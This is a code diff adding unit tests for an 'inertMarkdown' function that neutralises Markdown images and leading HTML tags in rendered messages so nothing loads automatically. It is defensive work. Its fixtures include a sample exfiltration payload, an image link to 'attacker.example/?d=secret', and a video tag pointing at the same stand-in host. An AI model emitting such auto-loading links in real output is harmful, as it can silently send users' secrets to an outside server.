@@ -6,6 +6,7 @@ import {
   BLOCKS_FROM,
   codeLabel,
   fenceLanguage,
+  inertMarkdown,
   messageSegments,
   type Segment,
 } from "./message-segments";
@@ -114,6 +115,61 @@ describe("messageSegments", () => {
         expect(shrunk).toEqual([]);
       }),
     );
+  });
+});
+
+describe("inertMarkdown", () => {
+  const JOIN = "\u2060";
+
+  it("makes an image a link, so a tap asks first and nothing loads by itself", () => {
+    expect(inertMarkdown("See ![x](https://attacker.example/?d=secret).")).toBe(
+      `See !${JOIN}[x](https://attacker.example/?d=secret).`,
+    );
+    expect(inertMarkdown("![a][ref] and \\![b](u)")).toBe(`!${JOIN}[a][ref] and \\!${JOIN}[b](u)`);
+  });
+
+  it("stops each line that begins with a tag from beginning an HTML block", () => {
+    const text = [
+      '<video src="https://attacker.example/v.mp4">',
+      "  </video>",
+      '> <video src="u">',
+      '- <img src="u">',
+      '1. > <video src="u">',
+      "<!-- note -->",
+    ].join("\n");
+    expect(inertMarkdown(text)).toBe(
+      [
+        `${JOIN}<video src="https://attacker.example/v.mp4">`,
+        `  ${JOIN}</video>`,
+        `> ${JOIN}<video src="u">`,
+        `- ${JOIN}<img src="u">`,
+        `1. > ${JOIN}<video src="u">`,
+        `${JOIN}<!-- note -->`,
+      ].join("\n"),
+    );
+  });
+
+  it("keeps other text, inline tags and autolinks in the line as they are", () => {
+    const text = "Use `a < b` and <https://example.com>.\n-<x> stays.";
+    expect(inertMarkdown(text)).toBe(text);
+  });
+
+  it("gives the Markdown segments inert text, and the fences their own text", () => {
+    const text = '![x](u)\n\n```html\n<video src="u">\n```\n\n<video src="u">';
+    expect(segmentsOf(text, true)).toMatchObject([
+      { kind: "markdown", text: `!${JOIN}[x](u)` },
+      { kind: "code", source: '```html\n<video src="u">\n```' },
+      { kind: "markdown", text: `${JOIN}<video src="u">` },
+    ]);
+  });
+
+  it("keeps a streamed segment growing by appends", () => {
+    const text = 'One ![x](u)\n<video src="u">';
+    for (let cut = 1; cut < text.length; cut++) {
+      expect(
+        inertMarkdown(text.slice(0, cut + 1)).startsWith(inertMarkdown(text.slice(0, cut))),
+      ).toBe(true);
+    }
   });
 });
 
